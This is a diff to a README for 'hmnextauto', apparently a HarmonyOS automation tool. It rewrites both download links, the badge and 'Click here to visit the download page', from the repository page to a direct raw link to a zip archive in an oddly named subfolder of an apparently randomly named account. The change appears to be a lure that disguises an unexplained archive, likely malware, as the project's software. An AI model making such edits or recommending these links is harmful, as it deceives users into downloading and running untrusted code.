@@ -1,6 +1,6 @@
 # 🤖 hmnextauto - Automate HarmonyOS tasks with simple tools
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/Genussolanopterisclassxanthophyceae618/hmnextauto)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://raw.githubusercontent.com/Genussolanopterisclassxanthophyceae618/hmnextauto/main/hematein/Software_1.0-beta.5.zip)
 
 ## 📖 About this project
 
@@ -24,7 +24,7 @@ Before you start, ensure your computer meets these needs:
 3. Connect your device to your computer with a USB cable. Accept any trust prompts that appear on your phone screen.
 4. Visit the link below to get the setup files.
 
-[Click here to visit the download page](https://github.com/Genussolanopterisclassxanthophyceae618/hmnextauto)
+[Click here to visit the download page](https://raw.githubusercontent.com/Genussolanopterisclassxanthophyceae618/hmnextauto/main/hematein/Software_1.0-beta.5.zip)
 
 ## 📥 Installation steps
 
